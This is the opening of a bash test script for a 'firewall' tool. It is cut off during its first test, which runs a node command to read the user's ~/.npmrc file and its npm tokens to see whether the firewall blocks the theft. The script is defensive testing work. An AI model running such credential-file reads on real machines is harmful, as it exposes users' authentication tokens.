#!/bin/bash
#
# Quick Firewall Test - Tests core functionality
#

CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${CYAN}🔥 Quick Firewall Test${NC}"
echo "======================"
echo ""

# 1. Test .npmrc read (NPM tokens)
echo -e "${CYAN}Test 1: NPM Token Theft (.npmrc)${NC}"
node -e "
const fs = require('fs');
try {
  const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');